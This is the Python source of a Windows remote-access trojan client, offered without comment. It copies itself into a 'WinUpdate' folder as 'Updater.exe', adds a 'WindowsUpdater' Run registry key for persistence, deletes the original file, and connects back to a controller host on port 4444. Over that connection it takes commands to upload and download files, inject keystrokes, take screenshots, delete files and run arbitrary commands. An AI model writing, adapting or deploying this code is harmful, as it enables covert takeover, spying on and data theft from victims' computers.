def win():

    import socket
    import os
    import modules.download as download
    import modules.keys as keys
    import modules.upload as upload
    import modules.cd as cd
    import modules.sleeper as sleeper
    import modules.shot as shot
    import modules.listdir as listdir
    import modules.exitprog as exitprog
    import modules.delete as delete
    import modules.commands as commands
    import sys
    import subprocess as sb
    import shutil
    import time
    from pynput.keyboard import Key, Controller
    import pyautogui
    import os
    from PIL import ImageGrab
    from functools import partial

    ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)

    keyboard = Controller()

    HOST = 'IP ADDRESS'
    PORT = 4444

    cfilepath = sys.executable
    currentfile = (sys.executable).split('\\')[-1]
    if currentfile != 'Updater.exe':
        time.sleep(60)
        currentuser = os.getlogin()
        filepath = f'C:\\Users\\{currentuser}\\WinUpdate'
        try:
            os.mkdir(filepath)
        except FileExistsError:
            pass
        sb.Popen(f'copy {currentfile} {filepath}\\Updater.exe', stdout=sb.PIPE, stderr=sb.PIPE, stdin=sb.PIPE, shell=True)
        globe_pers = sb.Popen(f'REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsUpdater" /t REG_SZ /F /D "{filepath}\\Updater.exe"', stdout=sb.PIPE, stderr=sb.PIPE, stdin=sb.PIPE, shell=True)
        put = globe_pers.stdout.read() + globe_pers.stderr.read()
        if 'ERROR' in (put.decode('UTF-8')):
            user_pers = sb.Popen(f'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsUpdater" /t REG_SZ /F /D "{filepath}\\Updater.exe"', stdout=sb.PIPE, stderr=sb.PIPE, stdin=sb.PIPE, shell=True)
            pass
        else:
            pass
        f = open(f'{filepath}\\tmp.txt', 'w')
        f.write(cfilepath)
        f.close()
        sb.Popen(f'{filepath}\\Updater.exe', stdout=sb.PIPE, stderr=sb.PIPE, stdin=sb.PIPE, shell=True)
        sys.exit()
    else:
        try:
            truedef = cfilepath.split('Updater.exe')[0]
            f = open(f'{truedef}tmp.txt', 'r')
            os.remove((f.read()))
            f.close()
            os.remove(f'{truedef}tmp.txt')
            pass
        except FileNotFoundError:
            pass
        pass

    def mainproc():
        currentuser = os.getlogin()
        os.chdir(f'C:\\Users\\{currentuser}\\Desktop')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            pass
        except ConnectionResetError:
            sys.exit()
        while True:
            try:
                data = s.recv(1024)
                raw = data.decode('UTF-8')
                if 'download' in raw:
                    download.dl()
                elif '<keys>' in raw:
                    keys.keystoke()
                elif '<up>' in raw:
                    upload.upies()
                elif 'cd' in raw:
                    cd.changedirect()
                elif raw == 'sleep':
                    sleeper.bed()
                elif raw == '<sc>':
                    shot.screen()
                elif raw == "ls":
                    listdir.ls()
                elif raw == "exit":
                    exitprog.quit()
                elif "del" in raw:
                    delete.delete()
                else:
                    commands.basic()
            except ConnectionAbortedError:
                sys.exit()

    mainproc()